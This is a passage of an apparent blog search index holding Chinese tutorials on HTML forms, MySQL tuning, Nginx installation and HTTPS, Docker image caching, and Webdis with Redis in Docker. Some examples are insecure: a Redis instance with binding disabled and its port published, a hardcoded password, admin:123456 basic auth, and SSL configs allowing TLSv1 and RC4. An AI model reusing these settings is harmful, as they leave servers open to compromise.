/&gt;&lt;label for="edu-level-5"&gt;博士&lt;/label&gt; &lt;br&gt;&lt;br&gt; 国籍： &lt;select&gt; &lt;option value="0"&gt;泰国&lt;/option&gt; &lt;option value="1" selected&gt;中国&lt;/option&gt; &lt;option value="2"&gt;日本&lt;/option&gt; &lt;option value="3"&gt;韩国&lt;/option&gt; &lt;option value="4"&gt;印度&lt;/option&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; 工作年限： &lt;select&gt; &lt;optgroup label="初级"&gt; &lt;option value="1"&gt;1 年&lt;/option&gt; &lt;option value="2"&gt;2 年&lt;/option&gt; &lt;option value="3"&gt;3 年&lt;/option&gt; &lt;/optgroup&gt; &lt;optgroup label="中级"&gt; &lt;option value="4"&gt;4 年&lt;/option&gt; &lt;option value="5"&gt;5 年&lt;/option&gt; &lt;option value="6"&gt;6 年&lt;/option&gt; &lt;/optgroup&gt; &lt;optgroup label="高级"&gt; &lt;option value="7"&gt;7 年&lt;/option&gt; &lt;option value="8"&gt;8 年&lt;/option&gt; &lt;option value="9"&gt;9 年&lt;/option&gt; &lt;option value="10"&gt;10 年&lt;/option&gt; &lt;/optgroup&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; 兴趣爱好： &lt;input type="checkbox" value="0" id="read"&gt;&lt;label for="read"&gt;阅读&lt;/label&gt; &lt;input type="checkbox" value="2" id="sport"&gt;&lt;label for="sport"&gt;运动&lt;/label&gt; &lt;input type="checkbox" value="3" id="music"&gt;&lt;label for="music"&gt;音乐&lt;/label&gt; &lt;br&gt;&lt;br&gt; &lt;label for="evaluate"&gt;自我评价：&lt;/label&gt; &lt;br&gt; &lt;textarea id="evaluate" cols="50" rows="6"&gt;&lt;/textarea&gt; &lt;br&gt;&lt;br&gt; &lt;input type="submit" value="提交"&gt;&lt;/button&gt; &lt;input type="reset" value="重置"&gt;&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 特殊字符 代码注释12&lt;!-- 这是HTML代码的注释 --&gt;&lt;img src="phone.jpg" width="800px" height="1000px"&gt; 搜索引擎优化利用 &lt;meta&gt; 标签可以进行搜索引擎优化，示例 HTML 代码如下： 12&lt;meta name="keywords" content="前端开发"&gt;&lt;meta name="description" content="前端入门基础的 HTML 与 CSS 知识点。"&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"MySQL 性能优化 - 第一篇",url:"/posts/b562d0a3.html",text:'查询各种 SQL 的执行频率语法：show [session|global] status like ‘% Com_%’; 查询示例： 12345678# 查询当前数据库执行CRUD操作的次数show global status like \'com_select\';show global status like \'com_insert\';show global status like \'com_update\';show global status like \'com_delete\';# 查看当前数据库的连接数show global status like \'connections\'; 慢查询优化启用记录慢查询日志注意：通过 MySQL 命令来修改慢查询相关参数，无论修改全局还是当前会话内的配置参数，在 MySQL 重启之后都会失效，想永久生效必须修改 MySQL 的配置文件。 1234567891011121314151617# 修改当前会话的慢查询定义时间set long_query_time = 1;# 或者修改全局默认的慢查询定义时间set global long_query_time = 1;# 查询是否开启了记录慢查询日志show variables like \'%slow%\';# 开启记录慢查询日志set global slow_query_log = on;# 查询慢查询发生的次数show status like \'slow_queries\';# 查询默认的慢查询定义时间show variables like \'long_query_time\'; 永久启用记录慢查询日志MySQL5.6 开启慢查询日志，需要在配置文件 my.cnf 中添加以下配置。 12345678# 慢查询时间long_query_time=1# 是否记录慢查询slow_query_log=TRUE# 慢查询日志文件的路径slow_query_log_file=/var/log/mysqld-slow.log 索引优化添加、删除索引索引的类型包括主键索引、唯一索引、普通索引、全文索引，比较特殊的是复合索引 (单个索引作用在多列上)，其中索引的添加、删除、使用率查询语法如下： 1234567891011121314151617181920212223242526# 查询某张表的索引信息show keys from table_xx;show index from table_xx;# 添加主键索引alter table table_xx add primary key(column_name);# 添加普通索引create index index_name on table_xx(column_name);alter table table_xx add index index_name(column_name);# 添加唯一索引，唯一索引所在的列值可以为Null，同时可以存在多个Null值create unique index index_name on table_xx(column_name);create table table_xx(id primary key auto_increment, name varchar(20) unique);# 全文索引只对MyIsam存储引擎有效，且只针对英文生效；Mysql中可以使用sphinx(coreseek)技术处理中文的全文索引，正确使用全文索引查询的语法如下，其中title、body字段存在全文索引select * from articles where match(title, body) against(\'tomcat\');# 删除索引(适用于唯一索引、普通索引、全文索引)alter table table_xx drop index index_name;# 删除主键索引alter table table_xx drop primary key;# 查看索引的使用率show status like \'Handler_read%\'; 索引的适用场景12345678910# 较频繁的作为查询条件字段应该创建索引select * from emp where empno = 1# 唯一性太差的字段不适合单独创建索引，即使是频繁作为查询条件select * from emp where sex = \'男\'# 更新非常频繁的字段不适合创建索引select * from emp where logincount = 1# 不会出现在WHERE子句中的字段不该创建索引 索引不生效的情况 对于多列索引，如果不是使用的第一部分，则不会使用索引 如果 MySQL 估算使用全表扫描要比使用索引快，则不会使用索引 like 查询，即是以 % 开头的查询不会使用索引，除非 select 数据列都加了索引 如果列类型是字符串，那一定要在条件中将数据使用单引号包起来，否则索引不生效 如果条件中有 or，即使其中有部分条件带索引也不会使用。换言之，必须所有列都建有索引才有效 锁优化查询表级锁争用情况 其他优化group by 优化group by 之后默认会执行排序操作，可以使用 group by xxx order by null 强制不进行排序操作。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"数据库"},{title:"Centos7 生产环境安装 Nginx",url:"/posts/9da397da.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 安装 Supervisor 12345678910111213# 提示：supervisor主要用于管理nginx的开机自启动（带守护进程）# 安装# yum install -y supervisor# 开机自启动# systemctl enable supervisord# 启动服务# systemctl start supervisord# 查看服务状态# systemctl status supervisord 更改系统的最大打开文件描述符数 本站教程 创建 Nginx 用户和用户组 12345678# 切换root用户$ sudo -i# 创建nginx用户组# groupadd nginx# 创建nginx用户（不允许远程登录）# useradd -g nginx nginx -s /bin/false 下载 Nginx 123456789# 创建下载目录# mkdir -p /home/nginx/software# 下载# cd /home/nginx/software# wget http://nginx.org/download/nginx-1.16.0.tar.gz# 解压# tar -xvf nginx-1.16.0.tar.gz 编译安装 Nginx 123456789101112131415161718192021222324252627# 进入下载目录# cd /home/nginx/software/nginx-1.16.0# 安装依赖库# yum install -y gcc gdb strace gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel e2fsprogs patch e2fsprogs-devel krb5-devel libidn libidn-devel openldap-devel nss_ldap openldap-clients openldap-servers libevent-devel libevent uuid-devel uuid openssl openssl-devel pcre pcre-devel# 配置./configure \\ --user=nginx \\ --group=nginx \\ --prefix=/usr/local/nginx \\ --with-pcre \\ --with-http_v2_module \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module# 编译安装# make &amp;&amp; make install# 备份默认的配置文件# cd /usr/local/nginx/conf# cp nginx.conf nginx.conf.default# 文件授权# chown -R nginx:nginx /usr/local/nginx 配置 Nginx 1234567# 编辑nginx的配置文件# vim /usr/local/nginx/conf/nginx.confworker_processes 4;error_log logs/error.log;# 校验配置文件是否正确# /usr/local/nginx/sbin/nginx -t 开机自启动 Nginx 1234567891011121314151617181920212223242526272829303132# 创建nginx的supervistor配置文件# touch /etc/supervisord.d/nginx.ini# 编辑nginx的supervistor配置文件# vim /etc/supervisord.d/nginx.ini[program:nginx]directory=/usr/local/nginxcommand=/usr/local/nginx/sbin/nginx -g \'daemon off;\' -c /usr/local/nginx/conf/nginx.confuser=rootnumprocs=1autostart=trueautorestart=truestartretries=10process_name=%(program_name)sstdout_logfile_backups=5stdout_logfile_maxbytes=10MBstdout_logfile=/var/log/supervisor/nginx.logstderr_logfile_backups=5stderr_logfile_maxbytes=10MBstderr_logfile=/var/log/supervisor/nginx-error.log# 上面的配置，主进程会以root用户运行，worker进程会以nginx用户运行# 重载nginx的supervistor配置文件，会自动启动nginx服务# supervisorctl reload# 查看nginx的运行状态# supervisorctl status nginxnginx RUNNING pid 9451, uptime 0:00:56 #如果输出此日志信息，说明nginx启动成功，否则查看nginx的启动日志来排查问题# 测试访问nginx# curl -I -X GET 127.0.0.1:80 配置防火墙 12345678# 开放端口# firewall-cmd --zone=public --permanent --add-port=80/tcp# 保存防火墙配置# firewall-cmd --reload# 查看已开放的端口# firewall-cmd --list-ports 管理 Nginx 服务 1234567891011121314# 关闭# supervisorctl stop nginx# 启动# supervisorctl start nginx# 重启# supervisorctl restart nginx# 查看状态# supervisorctl status nginx# 平滑更新nginx的配置文件# /usr/local/nginx/sbin/nginx -s reload Nginx 配置概述 12345安装目录：/usr/local/nginx配置文件：/usr/local/nginx/conf/nginx.conf错误日志：/usr/local/nginx/logs/error.log访问日志：/usr/local/nginx/logs/access.lognginx的supervistor配置文件：/etc/supervisord.d/nginx.ini var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"web服务器 centos"},{title:"Docker 安装 Webdis",url:"/posts/c87853c9.html",text:'前言 Webdis 是一个非常简单的 Web 服务器，专门为 Redis 提供 HTTP 接口，使用 hiredis、jansson、libevent、http-parser 等组件。下面将介绍 Docker 安装部署 Webdis 与 Redis，由于篇幅有限不会详细介绍部署过程，但会给出 Docker 相关的主要配置内容。如需更详细的教程内容，可参考 Webdis Github 上的说明文档。 软件环境 环境名称 版本 docker-ce 18.09.3 docker-compose 1.24.0-rc1 linux 发行版 CentOS Linux release 7.6.1810 (Core) Webdis 镜像的 DockerFile 12345678910111213141516171819202122232425262728from debian:stretchMAINTAINER clay&lt;clay@gmail.com&gt;RUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install apt-utils vim net-tools telnet git curl wget make gcc libevent-devRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveENV version 0.1.4WORKDIR /usr/localRUN wget --no-check-certificate https://github.com/nicolasff/webdis/archive/$version.tar.gz -O webdis-$version.tar.gzRUN tar -xvzf webdis-$version.tar.gzRUN cd webdis-$version &amp;&amp; make &amp;&amp; make install &amp;&amp; cd ..RUN rm -rf webdis-$version.tag.gzWORKDIR /usr/local/webdis-$versionEXPOSE 7379CMD /usr/local/bin/webdis /etc/webdis.prod.json &amp;&amp; bash 构建 Webdis 镜像 12345678# 创建DockerFile# touch Dockerfile-Webdis# 将上述内容写入到DockerFile中# vim Dockerfile-Webdis# 构建Webdis镜像# docker build -f Dockerfile-Webdis -t clay/webdis:0.1.4 . Redis 的配置文件 Redis 配置文件中的主要内容（redis.conf）如下： 12345# 注释掉下面这一行，不绑定任何主机IP# bind 127.0.0.1# 设置Redis密码requirepass C6v8TMQv@oc%4HkznfKJ5jy&amp;zBUencAL Webdis 的配置文件 Webdis 配置文件（webdis.prod.json）的完整内容如下，具体的 ACL 规则可参考 Github 上的说明文档。考虑到服务器安全，下面配置了 Http Auth 的用户名和密码。 1234567891011121314151617181920212223242526{ "redis_host": "172.89.0.2", "redis_port": 6379, "redis_auth": "C6v8TMQv@oc%4HkznfKJ5jy&amp;zBUencAL", "http_host": "0.0.0.0", "http_port": 7379, "threads": 4, "daemonize": false, "database": 0, "acl": [ { "disabled": ["DEBUG", "FLUSHDB", "FLUSHALL", "GET", "SET", "DEL"] }, { "http_basic_auth": "admin:123456", "enabled": ["DEBUG", "GET", "SET", "DEL"] } ], "verbosity": 3, "logfile": "/var/log/webdis.log"} Docker-Compose 的配置文件 使用 Docker-Compose 管理容器，其中 docker-compose.yml 配置文件的完整内容如下（包括 Redis、Webdis）。具体的数据卷挂载目录，需要根据自己的实际情况进行修改。 123456789101112131415161718192021222324252627282930313233343536373839version: "3.5"services: redis: image: redis:5.0.4-stretch container_name: redis-5.0.4 privileged: false ports: - 6379:6379 networks: redis-network: ipv4_address: 172.89.0.2 volumes: - \'/container/redis/data:/data\' - \'/container/redis/redis.conf:/usr/local/etc/redis/redis.conf\' command: redis-server /usr/local/etc/redis/redis.conf webdis: image: clay/webdis:0.1.4 container_name: webdis privileged: false depends_on: - redis networks: redis-network: ipv4_address: 172.89.0.3 ports: - 7379:7379 volumes: - \'/container/wedis/webdis.log:/var/log/webdis.log\' - \'/container/wedis/webdis.prod.json:/etc/webdis.prod.json\'networks: redis-network: name: redis-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 创建并启动 Docker 容器 1234567891011# 进入docker-compose.yml配置文件所在的目录# cd docker-compose-dir# 以后台方式启动Redis、Webdis容器# docker-compose up -d# 查看容器的启动情况# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESebd5cac7fee9 clay/webdis:0.1.4 "/bin/sh -c \'/usr/lo…" 14 minutes ago Up 14 minutes 0.0.0.0:7379-&gt;7379/tcp webdis9a1feb971d1c redis:5.0.4-stretch "docker-entrypoint.s…" 14 minutes ago Up 14 minutes 0.0.0.0:6379-&gt;6379/tcp redis-5.0.4 CURL 命令测试 Webdis 与 Redis 是否正常工作 1234567891011# 写入key# curl http://127.0.0.1:7379/SET/hello/world -u admin:123456{"SET":[true,"OK"]}# 获取key# curl http://127.0.0.1:7379/GET/hello -u admin:123456{"GET":"world"}# 删除key# curl http://127.0.0.1:7379/DEL/hello -u admin:123456{"DEL":1} NodeJS 代码测试 Webdis 与 Redis 是否正常工作 123456789101112131415161718192021222324var request = require(\'request\');var username = "admin";var password = "123456";var url = \'http://127.0.0.1:7379/GET/hello\';var auth = "Basic " + new Buffer(username + ":" + password).toString("base64");request({ url: url, headers: { "Authorization": auth } }, function(error, response, body) { if (error) { console.log(error); return; } if (response.statusCode == 200) { console.log("result: " + body); } else { console.log("code: " + response.statusCode); } }); WebSocket 与 Pub/Sub 的支持 Webdis 默认不启用 WebSocket 与 Pub/Sub 的支持，如需要相关功能，可以参考以下的步骤进行操作。官方声明 Websocket 与 Pub/Sub 功能是实验性的，生产环境慎用。经过反复测试，按照下面的步骤进行操作，JavaScript 代码依然无法连接 WebSocket、Pub/Sub 服务，后续再想办法解决。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 连接上面创建的webdis容器# docker run -it webdis /bin/bash# 进入webdis的tests目录# cd /usr/local/webdis-0.1.4/tests# tests目录结构介绍|-- Makefile|-- README.tests|-- basic.py # 单元测试脚本|-- bench.sh # 压测脚本|-- limits.py|-- pubsub.c # pub/sub支持|-- websocket.c # websocket支持`-- websocket.html # websocket的html5测试页面# 编译websocket、pub/sub的代码# make# 查看websocket命令的使用方法$ ./websocket -hUsage: ./websocket [options]Options are: -h host (default = "127.0.0.1") -p port (default = 7379) -c threads (default = 4) -n count (number of messages per thread, default = 100000) -v (verbose)# 启动websocket服务，其中127.0.0.1是webdis服务的IP，7379是webdis服务的端口$ ./websocket -h 127.0.0.1 -p 7379 -v# 查看pubsub命令的使用方法$ ./pubsub -hUsage: ./pubsub [options]Options are: -h host (default = "127.0.0.1") -p port (default = 7379) -r readers (default = 450) -w writers (default = 10) -c channels (default = 1) -n messages (number of messages to read in total, default = 100000)# 启动pub/sub服务，其中127.0.0.1是webdis服务的IP，7379是webdis服务的端口# 经测试，pub/sub服务的启动会导致webdis服务意外停止，原因暂时未知$ ./pubsub -h 127.0.0.1 -p 7379 JavaScript 代码测试 WebSocket 服务 1234567891011121314function testJSON() { var jsonSocket = new WebSocket("ws://127.0.0.1:7379/.json"); jsonSocket.onopen = function() { console.log("JSON socket connected!"); jsonSocket.send(JSON.stringify(["SET", "hello", "world"])); jsonSocket.send(JSON.stringify(["GET", "hello"])); }; jsonSocket.onmessage = function(messageEvent) { console.log("JSON received:", messageEvent.data); };}testJSON(); JavaScript 代码测试 Pub/Sub 服务 1234567891011121314var previous_response_length = 0xhr = new XMLHttpRequest()xhr.open("GET", "http://127.0.0.1:7379/SUBSCRIBE/hello", true);xhr.onreadystatechange = checkData;xhr.send(null);function checkData() { if(xhr.readyState == 3) { response = xhr.responseText; chunk = response.slice(previous_response_length); previous_response_length = response.length; console.log(chunk); }}; Webdis 的 SSL 支持 Webdis 官方默认不支持 SSL，如果需要 SSL 的支持，可以使用 Nginx 作为反向代理服务器，即配置 Nginx 的代理与 SSL 证书，然后将请求转发给 Webdis，这样就可以提高 Webdis 连接的安全性。Nginx 的示例配置内容如下： 1234567891011121314151617181920212223server { listen 18379; # Webdis的IP与端口 server_name 172.89.0.3:7379; # SSL证书 ssl on; ssl_certificate /usr/local/nginx/cert/example.cn.crt; ssl_certificate_key /usr/local/nginx/cert/example.cn.key; # SSL性能调优 ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; location / { # 代理 proxy_pass http://$server_name; }} 12# 使用CURL命令测试Nginx的代理与SSL配置是否正确，其中example.com是绑定了SSL证书的域名# curl https://example.com:18379/GET/hello -u admin:123456 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化 缓存"},{title:"3D 打印备忘录",url:"/posts/d06622f5.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af788dd4f62e8eb66ae305f630934e5a372b3b0f7d6553bed8353ebd19956f4e8ad23f696e7967853cc33f6d6ee5b71eaa7c96ca051a6def086e08b46a5872168fa6b5560b18d7d933e854833d7331aee9c96e79b865d1f4ff97deabe5a78e813f8331ca97fb91b9e053f2cb1eb989e4a1d09b46d8a20e893120edcc81d062359f1eea934a5dcb39734cc45f08b7b39874721ddc1970fb17aee30f34d585548f100e30bceb63c5c785a2d15ab5196a7ff6c1df32ba27195f63b965a0631bb7e259acac6bcec1ace74d5d82ecf816cdc7b782562d646edd642a4780fd547c1f5bee93f4f8831fb2ea5d9e5a1d38c93d2dfeeaf87ffe671a4d4a4e51660276bcfe1ccfc883d5dfd3eb9895a011c340719244a4122c78aadf0d1f4b43717cfe67646c639dbf332f39ccce9bebfa4709c0158b54435f3806967617987c50db4203bbe03dde35d6147f56cf81e816de976f64bad2787bb4e2490c6cc04d7c7f3ec36d987d4b9a899f949457ec11825211615e18ad01a4519cec2f10b9b02db2b1107c0ddae5133a2e1b7c27ec62b49c22a8e4171191faabd4a6f609898759d91bca06c7bedf139c0cb12bea46007e03f328794e2a257bfb8a8c0060c43ebde849996ee6cb23cfef2a0566581b918e4ca655e86c286e89424c42da62995bcdd29a919c652b693572386bbeacc1cf61bcb199c11158663943e487525c6e069d80a57c29a13600284233a81daba20e8924d27a2f096f59c3c5eb26b868c285b68e9546fc4876fa74c1961484c22d4a8a8206e1a4dffc068ad65de59878c7b0a64bc1ea727c673b28b8fdb563c61830dd3ddcbb6ea578c52a57ce4ab15259a7ad0817c48aa363f93d1ca510298626ffa590eb63f1075c5f88d09026c17db2aa7a9c499a3e48410330365655887d51524ca40fc0a56bd6af24ff9a2b693faa55cb44de820b17a1e9b8068153fc412a691172d43cfa3b996b5e433650b94d362c43202eed82a2db82e8ccc272783055bad3e6a8170158a2aa44d6cedffb2a94c34011258e06cb8a0cdc3a2e260a3023e44498919c276c7e9658743483371cf847ecfa19949a3aa9c5528156b57830760cbb533b03fb338100d6bb22bc13e7860272a20e739c09266891a0da06c0af0faad1947becae0b32df2643f74dd3052ea2b6d972ccbce9c7b9c6183ba2b5b04e97d23cb37dc43c834f4894664b557e6705bff04df2122a8bbcdd20c0df5474d54a23cb3311b9f2bdddaf885fd670a9b8a5062ce5fda48fcd03fa235853e9dbddf94879e62a1c7bcf6c3eda212ac5a193cd4f576b12c4f2824df69dcd202a95bb9087c68bc74bb0b5c1c561f61a0344acd648bf650e1296acd9ef0bbf3318224d7d5c4fc12e41823e04ecbac3a774bdc36c08dc1e2b95e4d03a586591b2dd892f67388349d04c123b2e625cdfa7b563308293d818686052c719b857f128382120933294735af04543a18e71f6d46664ce21810c8dcaa237dcb24802882cd89a06751b3792d101692ca96b99213653af90b17cfe58f1159d96215c60165bbd5756aff881b280d56d827e021fa123a831d0f4fd4ae3cc65c5d7937f5298061dd121bc6433754c33c55b864eb8d42047e0917fbb274b0743e8d72e1a05c584f7c892bfbc05c015a34b23c12ac34a717776780755b36d05ea7e3e35da4ac02693ecd6139dd7ffc9cbb5bef2532ef00d400359d5b82c2388abcd639cc9ea850f4ae0389ad3894dbd543724830f3525c6e7d0b6e4e8f3ae33c1fcb81792142f108d772be521a1f39766dbd1727fd42c8052d5a9229be302b141f039cd8e6058599a6b53a6dca4f84c03784f78a749f1273d0e43561b7acea73b6880ec1369ee45677db13ba81fff2ee2c229c9636fc6f4f20fa319ff5ff9940dae61006fefd6a7187da320f652ffda8209e91d40d30e05f2c82f5b331a24cdc7836869548c97f47ec3a52f0ca092872f7cb1c068aa3da19896504c92a7dfa8696e3579fcd01535f724f06e5843520cd8162ff08e386e1fc1ee3577c6720149f513025ef58b6dcc4d25a0af562a61ac3ec72a664d56e87ce152b3e1c34ce7dd3b210eb4bc8afb85f1a310a39d2be5577ed278269b5b3d28ee1e20d8f222986f5eea286b9c8e60cc861aaaa5e6a02bf2fa1ab20d8812f02b776ed8e2b6234ebbb27843a0d8ff22f72b946ba33ed00eac58a745b42e3376f51bf2d1acca37d544da01 请 输 入 阅 读 密 码.",tags:"加密博客"},{title:"Nginx 配置 Https",url:"/posts/d65a2736.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux 3.10.0-957.12.2.el7.x86_64 #1 SMP Tue May 14 21:24:32 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 系统安装 OpenSSL 12345# 更新系统# yum update# 安装openssl# yum install openssl openssl-devel Nginx 安装 SSL 模块 1234567891011121314# 配置编译# ./configure \\ --user=nginx \\ --group=nginx \\ --prefix=/usr/local/nginx \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_concat_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module \\ --with-http_upstream_consistent_hash_module# 编译安装，会覆盖已安装的Nginx# make &amp;&amp; make install Nginx 配置 SSL 证书与 SSL 性能调优 123456789101112131415161718server { listen 443; server_name www.example.cn; # SSL证书 ssl on; ssl_certificate /usr/local/nginx/cert/example.cn.crt; ssl_certificate_key /usr/local/nginx/cert/example.cn.key; # SSL性能调优 ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; ...（省略）} Nginx 配置 Http 跳转 Https 123456789101112131415161718192021222324252627# 第一种写法server { listen 80; server_name www.example.cn; rewrite ^(.*) https://$server_name$1 permanent;}# 第二种写法，将http的url通过301状态码重定向到https的url上server { listen 80; server_name www.example.cn; return 301 https://$server_name$request_uri;}server { listen 443; server_name www.example.cn; # SSL性能调优 ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; ...（省略）} Nginx 配置支持同时访问 80 和 443 端口 1234567891011121314151617181920212223server { listen 80; listen 443 ssl; server_name www.example.cn; if ($server_port !~ 443){ rewrite ^(/.*)$ https://$host$1 permanent; } # SSL证书 # ssl on; # 注释掉 ssl_certificate /usr/local/nginx/cert/example.cn.crt; ssl_certificate_key /usr/local/nginx/cert/example.cn.key; # SSL性能调优 ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; ...（省略）} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"web服务器"},{title:"Docker 之十八镜像瘦身",url:"/posts/4880517.html",text:'缓存 Docker 的优点之一是提供缓存，帮助你更快地迭代镜像构建。在构建映像时，Docker 按步骤遍历 Dockerfile 中的指令，按顺序执行每个指令。在检查每个指令时，Docker 会在其缓存中寻找一个可以重用的现有中间镜像，而不是创建一个新的 (重复的) 中间镜像。如果缓存无效，让无效的指令和所有后续 Dockerfile 指令生成新的中间镜像。因此，从 Dockerfile 的顶部开始，如果基础镜像已经在缓存中，那么它将被重用。然后将下一条指令与从该基础镜像派生的缓存中的所有子镜像进行比较。比较每个缓存的中间镜像，看指令是否在缓存命中。如果缓存失败，则缓存无效。重复相同的过程，直到到达 Dockerfile 的末尾。 缓存陷阱 大多数新指令只是简单地与中间镜像中的指令进行比较。如果匹配，则使用缓存的副本。例如，当在 Dockerfile 中找到 RUN pip install -r requiremtes .txt 指令时，Docker 会在本地缓存的中间镜像中搜索相同的指令。不比较新旧 requirements.txt 文件的内容。如果使用新包来更新 requirements.txt 文件，并使用 RUN pip install 并希望使用新包名称重新运行包安装，则此行为可能会出现问题。后续会展示一些解决方案。与其他 Docker 指令不同，ADD 和 COPY 指令确实需要 Docker 查看文件的内容，以确定是否存在缓存命中。将引用文件的校验和与现有中间镜像中的校验和进行比较。如果文件内容或元数据发生了更改，则缓存无效。 有效使用缓存的技巧 可以通过传递 –no-cache=True 给 docker build 关闭缓存。 如果你要对指令进行更改，那么接下来的每一层都将频繁地重新构建。要利用缓存，请在 Dockerfile 中尽可能靠后放置可能更改的指令。 合并 RUN apt-get update 和 apt-get install 命令，以避免缓存丢失问题。 如果你正在使用带有 requirements.txt 文件的包安装程序 (如 pip)，那么请遵循如下模型，以确保你不会收到带有 requirements.txt 中列出的旧包的陈旧的中间镜像。123COPY requirements.txt /tmp/RUN pip install -r /tmp/requirements.txtCOPY . /tmp/ 减少镜像体积 Docker 